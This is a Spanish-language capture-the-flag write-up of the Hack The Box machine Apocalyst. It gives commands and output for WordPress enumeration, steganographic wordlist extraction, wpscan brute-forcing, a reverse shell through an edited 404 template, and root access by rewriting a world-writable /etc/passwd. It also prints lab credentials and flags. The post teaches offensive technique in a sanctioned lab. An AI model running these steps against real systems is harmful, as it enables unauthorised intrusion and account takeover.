---
layout: single
title: Apocalyst - Hack The Box
excerpt: "En este post estaremos resolviendo la maquina Apocalyst de la plataforma de Hackthebox donde mediante una imagen obtendremos un diccionario para aplicar fuerza bruta a un panel de login gracias a eso vamos a modificar el 404 not found del wordpress para que cuando se ocasione un error nos envie una reverse shell a nuestra maquina de atacante para la escalada de privilegios abusaremos de que el /etc/passwd estando como www-data tenemos capacidad de escritura y lo modificaremos para ganar acceso como root"
date: 2023-07-21
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-apocalyst/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - Wordpress Enumeration
  - Image Stego Challenge
  - Abusing misconfigured permissions
  - WordPress Exploitation [RCE]
---

<p align="center">
<img src="/assets/images/htb-writeup-apocalyst/banner.png">
</p>

```bash
❯ ping -c 1 10.129.152.159
PING 10.129.152.159 (10.129.152.159) 56(84) bytes of data.
64 bytes from 10.129.152.159: icmp_seq=1 ttl=63 time=147 ms

--- 10.129.152.159 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 147.286/147.286/147.286/0.000 ms
❯ whichSystem.py 10.129.152.159

10.129.152.159 (ttl -> 63): Linux
```

## PortScan

```bash
❯ nmap -sCV -p22,80 10.129.152.159 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-21 18:33 CST
Nmap scan report for 10.129.152.159
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fdab0fc922d5f48f7a0a2911b404dac9 (RSA)
|   256 7692390a57bdf0032678c7db1a66a5bc (ECDSA)
|_  256 1212cff17fbe431fd5e66d908425c8bd (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apocalypse Preparation Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeracion 

Pues bueno vemos 2 puertos abiertos como tal la versión de **SSH** esta **desactualizada** así que como es vulnerable para enumerar usuarios y contraseñas pero por el momento como no tenemos ningún usuario pues no creo que valga la pena

```bash
❯ searchsploit ssh enum
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                      | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                | linux/remote/45210.py
OpenSSH 7.2p2 - Username Enumeration                                                          | linux/remote/40136.py
OpenSSH < 7.7 - User Enumeration (2)                                                          | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                                         | linux/remote/40113.txt
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Vamos a enumerar el puerto `80`

```ruby
❯ whatweb http://10.129.152.159
http://10.129.152.159 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.152.159], JQuery[1.12.4], MetaGenerator[WordPress 4.8], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[Apocalypse Preparation Blog], UncommonHeaders[link], WordPress[4.8]
```

Tenemos una versión de **Wordpress** muy **desactualizada**

Esta es la pagina web pero se ve así por que como tal esta cargando los recursos de un **subdominio** que estamos viendo en el código así que vamos agregarlo al `/etc/hosts` para que la web se vea bien

![](/assets/images/htb-writeup-apocalyst/web1.png)

![](/assets/images/htb-writeup-apocalyst/web2.png)

```bash
❯ echo "10.129.152.159 apocalyst.htb" | sudo tee -a /etc/hosts
10.129.152.159 apocalyst.htb
```

Ahora los recursos de la web cargan de forma correcta

![](/assets/images/htb-writeup-apocalyst/web3.png)

Aquí vemos el panel de **login** de `Wordpress` si probamos con `admin:admin` vemos que tenemos una forma de enumerar usuarios validos

![](/assets/images/htb-writeup-apocalyst/web4.png)

Si aplicamos `Fuzzing` como tal nos si copiamos alguna ruta nos redirige aquí 

```bash
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt http://apocalyst.htb/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://apocalyst.htb/FUZZ
Total requests: 87664

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                        
=====================================================================

000000032:   301        9 L      28 W       313 Ch      "blog"                                                         
000000085:   301        9 L      28 W       313 Ch      "info"                                                         
000000099:   301        9 L      28 W       313 Ch      "page"                                                         
000000077:   301        9 L      28 W       313 Ch      "main"                                                         
000000062:   301        9 L      28 W       315 Ch      "events"                                                       
000000241:   301        9 L      28 W       319 Ch      "wp-content"                                                   
000000341:   301        9 L      28 W       313 Ch      "text"                                                         
000000340:   301        9 L      28 W       313 Ch      "post"                                                         
000000379:   301        9 L      28 W       313 Ch      "book"                                                         
000000396:   301        9 L      28 W       312 Ch      "art"                                                          
000000444:   301        9 L      28 W       313 Ch      "icon"                                                         
000000431:   301        9 L      28 W       314 Ch      "start"                                                        
000000466:   301        9 L      28 W       317 Ch      "pictures"                                                     
000000480:   301        9 L      28 W       317 Ch      "personal"                                                     
000000525:   301        9 L      28 W       315 Ch      "Search"                                                       
000000565:   301        9 L      28 W       320 Ch      "information"                                                  
000000641:   301        9 L      28 W       318 Ch      "reference"                                                    
000000669:   301        9 L      28 W       314 Ch      "entry"                                                        
000000739:   301        9 L      28 W       312 Ch      "get"                                                          
000000785:   301        9 L      28 W       320 Ch      "wp-includes"                                                  
000000862:   301        9 L      28 W       315 Ch      "custom"                                                       
000000856:   301        9 L      28 W       314 Ch      "state"                                                        
000000884:   301        9 L      28 W       313 Ch      "down"                                                         
000000872:   301        9 L      28 W       317 Ch      "language"                                                     
000000994:   301        9 L      28 W       313 Ch      "term"                                                         
000000988:   301        9 L      28 W       312 Ch      "RSS"                                                          
000001037:   301        9 L      28 W       313 Ch      "Blog"                                                         
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
```

Vemos esto 

![](/assets/images/htb-writeup-apocalyst/web5.png)

Vemos que simplemente esta cargando una imagen

![](/assets/images/htb-writeup-apocalyst/web6.png)

## Wordpress Admin Access  

Bueno después de estar usando varios **diccionarios** pues ninguno encontraba gran cosa a si que otra cosa que podemos hacer es `fuzzing` pero con un directorio personalizado por así decirle podemos usar `cewl`

```bash
❯ cewl -w dicc.txt http://apocalyst.htb
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
❯ wc -l dicc.txt
531 dicc.txt
```

Ahora si aplicamos **fuzzing** otra vez pero con nuestro **diccionario** personalizado encontramos una ruta interesante

```bash
❯ wfuzz -c -L --hc=404 --hh=157 -t 200 -w dicc.txt http://apocalyst.htb/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://apocalyst.htb/FUZZ
Total requests: 531

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                        
=====================================================================

000000455:   200        14 L     20 W       175 Ch      "Rightiousness"                                                

Total time: 0
Processed Requests: 531
Filtered Requests: 530
Requests/sec.: 0
```

Vemos la misma imagen

![](/assets/images/htb-writeup-apocalyst/web7.png)

![](/assets/images/htb-writeup-apocalyst/web8.png)

Lo que podemos hacer es descargarnos la imagen para analizarla mejor

Después de descargarla podemos usar `steghide` para extraer información ya que como tal tu puedes guardar data o información en una imagen y puedes protegerla con contraseña pero vemos que hay un archivo adjunto y nos lo descarga 

```bash
❯ steghide --extract -sf image.jpg
Anotar salvoconducto: 
anot los datos extrados e/"list.txt".
```

Como tal es un diccionario 

```bash
❯ cat list.txt | wc -l
486
```

Lo que puede ser es que como tal sea un diccionario para contraseñas o para rutas

Si analizamos los `posts` que vimos en la web principal vemos que tenemos un usuario `falaraki`

![](/assets/images/htb-writeup-apocalyst/web9.png)

Si introducimos el usuario y cualquier contraseña nos dice esto así que podemos saber que el usuario existe vamos a usar `wpscan` para hacer fuerza bruta y ver si la contraseña esta en el `txt` que nos descargamos

```bash
❯ wpscan --url http://apocalyst.htb -U falaraki -P list.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.21
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]N
[+] URL: http://apocalyst.htb/ [10.129.152.159]
[+] Started: Fri Jul 21 19:29:10 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://apocalyst.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://apocalyst.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://apocalyst.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://apocalyst.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
 | Found By: Rss Generator (Passive Detection)
 |  - http://apocalyst.htb/?feed=rss2, <generator>https://wordpress.org/?v=4.8</generator>
 |  - http://apocalyst.htb/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.8</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://apocalyst.htb/wp-content/themes/twentyseventeen/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://apocalyst.htb/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.2
 | Style URL: http://apocalyst.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://apocalyst.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:04 <=================================================> (137 / 137) 100.00% Time: 00:00:04

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - falaraki / Transclisiation                                                                                          
Trying falaraki / total Time: 00:01:01 <=====================                                > (335 / 821) 40.80%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: falaraki, Password: Transclisiation

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Jul 21 19:30:26 2023
[+] Requests Done: 508
[+] Cached Requests: 5
[+] Data Sent: 155.396 KB
[+] Data Received: 1.607 MB
[+] Memory used: 275.102 MB
[+] Elapsed time: 00:01:15
```

Tenemos credenciales `falaraki:Transclisiation`

Y funcionan

![](/assets/images/htb-writeup-apocalyst/web10.png)

## Shell as www-data

Bueno algo que podemos hacer aquí en el `wordpress` es borrar todo eso y enviarnos una `reverse shell` para que cuando se ocasione un error nos envié una reverse shell 

```bash
❯ nc -nlvp 443
Listening on 0.0.0.0 443
```

Y bueno al final queda así

![](/assets/images/htb-writeup-apocalyst/web11.png)

Ahora vamos a ocasionar un error para enviarnos la **reverse shell**

```bash
❯ curl -s -X GET "http://apocalyst.htb/?p=404.php"
```

Y ahora ganamos acceso

```bash
❯ nc -nlvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.152.159 35392
bash: cannot set terminal process group (1579): Inappropriate ioctl for device
bash: no job control in this shell
www-data@apocalyst:/var/www/html/apocalyst.htb$ whoami
whoami
www-data
www-data@apocalyst:/var/www/html/apocalyst.htb$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@apocalyst:/var/www/html/apocalyst.htb$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
ENTER
www-data@apocalyst:/var/www/html/apocalyst.htb$ export TERM=xterm
```

Tenemos que convertirnos directamente en el usuario **root**

```bash
www-data@apocalyst:/home$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
falaraki:x:1000:1000:Falaraki Rainiti,,,:/home/falaraki:/bin/bash
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
www-data@apocalyst:/home$ 
```

## User.txt 

```bash
www-data@apocalyst:/home/falaraki$ cat user.txt 
40b4d21095b44114de9129c5f531d1ca
www-data@apocalyst:/home/falaraki$ 
```

## Escalada de privilegios

Vemos el `pkexec` pero de momento no lo vamos a explotar

```bash
www-data@apocalyst:/$ find \-perm -4000 2>/dev/null
./bin/ping
./bin/ntfs-3g
./bin/mount
./bin/ping6
./bin/umount
./bin/su
./bin/fusermount
./usr/bin/at
./usr/bin/passwd
./usr/bin/newgrp
./usr/bin/sudo
./usr/bin/gpasswd
./usr/bin/chsh
./usr/bin/newgidmap
./usr/bin/newuidmap
./usr/bin/chfn
./usr/bin/pkexec
./usr/lib/eject/dmcrypt-get-device
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/snapd/snap-confine
./usr/lib/openssh/ssh-keysign
./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
www-data@apocalyst:/$ 
```

Nada interesante por acá

```bash
www-data@apocalyst:/$ getcap -r / 2>/dev/null
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
www-data@apocalyst:/$ 
```

En este archivo podemos ver credenciales para la base de datos

```bash
www-data@apocalyst:/var/www/html/apocalyst.htb$ cat wp-config.php 
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wp_myblog');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'Th3SoopaD00paPa5S!');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'put your unique phrase here');
define('SECURE_AUTH_KEY',  'put your unique phrase here');
define('LOGGED_IN_KEY',    'put your unique phrase here');
define('NONCE_KEY',        'put your unique phrase here');
define('AUTH_SALT',        'put your unique phrase here');
define('SECURE_AUTH_SALT', 'put your unique phrase here');
define('LOGGED_IN_SALT',   'put your unique phrase here');
define('NONCE_SALT',       'put your unique phrase here');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
www-data@apocalyst:/var/www/html/apocalyst.htb$ 
```

Y funcionan

```bash
www-data@apocalyst:/var/www/html/apocalyst.htb$ mysql -uroot -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 511
Server version: 5.7.19-0ubuntu0.16.04.1 (Ubuntu)

Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wp_myblog          |
+--------------------+
5 rows in set (0.01 sec)

mysql> 
```

Bueno como tal ya tenemos la contraseña a si que no hay que crackearla

```bash
mysql> use wp_myblog;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------------+
| Tables_in_wp_myblog   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)

mysql> describe wp_users;
+---------------------+---------------------+------+-----+---------------------+----------------+
| Field               | Type                | Null | Key | Default             | Extra          |
+---------------------+---------------------+------+-----+---------------------+----------------+
| ID                  | bigint(20) unsigned | NO   | PRI | NULL                | auto_increment |
| user_login          | varchar(60)         | NO   | MUL |                     |                |
| user_pass           | varchar(255)        | NO   |     |                     |                |
| user_nicename       | varchar(50)         | NO   | MUL |                     |                |
| user_email          | varchar(100)        | NO   | MUL |                     |                |
| user_url            | varchar(100)        | NO   |     |                     |                |
| user_registered     | datetime            | NO   |     | 0000-00-00 00:00:00 |                |
| user_activation_key | varchar(255)        | NO   |     |                     |                |
| user_status         | int(11)             | NO   |     | 0                   |                |
| display_name        | varchar(250)        | NO   |     |                     |                |
+---------------------+---------------------+------+-----+---------------------+----------------+
10 rows in set (0.00 sec)

mysql> select user_login,user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| falaraki   | $P$BnK/Jm451thx39mQg0AFXywQWZ.e6Z. |
+------------+------------------------------------+
1 row in set (0.00 sec)

mysql> 
```

## Shell as root and root.txt 

Si vemos archivos los cuales tengamos privilegios de escritura encontramos este que ya es interesante

```bash
www-data@apocalyst:/$ find / -writable -ls 2>/dev/null | grep -vE "/var|/run|/tmp|/dev|/lib|/sys|/proc"
    37330      4 -rw-rw-rw-   1 root     root         1637 Jul 26  2017 /etc/passwd
www-data@apocalyst:/$ 
```

Cuando tu haces por ejemplo un `sudo su` siempre va a comparar con lo que hay en el `/etc/shadow` para dejarte convertirte en el otro usuario al cual te quieras convertir pero para evitar eso lo que podemos hacer es modificar en el `/etc/passwd` nosotros decirle cual es la cadena encriptada para que no aplique la comparativa con el `/etc/shadow` si no directamente con lo que le proporcionamos

```bash
www-data@apocalyst:/$ cat /etc/passwd | head -n 1
root:x:0:0:root:/root:/bin/bash
www-data@apocalyst:/$ 
```

Para esto podemos usar `openssl` y poner lo que tu quieras para que nos cree la cadena

```bash
www-data@apocalyst:/$ openssl passwd
Password: 
Verifying - Password: 
/Wdb/9WH9GO3Q
www-data@apocalyst:/$ 
```

Ahora lo modificamos en el `/etc/passwd`

```bash
www-data@apocalyst:/$ nano /etc/passwd
Unable to create directory /var/www/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

www-data@apocalyst:/$ cat /etc/passwd | head -n 1
root:/Wdb/9WH9GO3Q:0:0:root:/root:/bin/bash
www-data@apocalyst:/$ 
```

Ahora simplemente hacemos un `su root` e indicamos la contraseña que indicamos con `openssl`

```bash
www-data@apocalyst:/$ su root
Password: 
root@apocalyst:/# whoami
root
root@apocalyst:/# id
uid=0(root) gid=0(root) groups=0(root)
root@apocalyst:/# 
```

```bash
root@apocalyst:/# cat /root/root.txt 
32a76f406ffba3867799d81fbac52d66
root@apocalyst:/# 
```
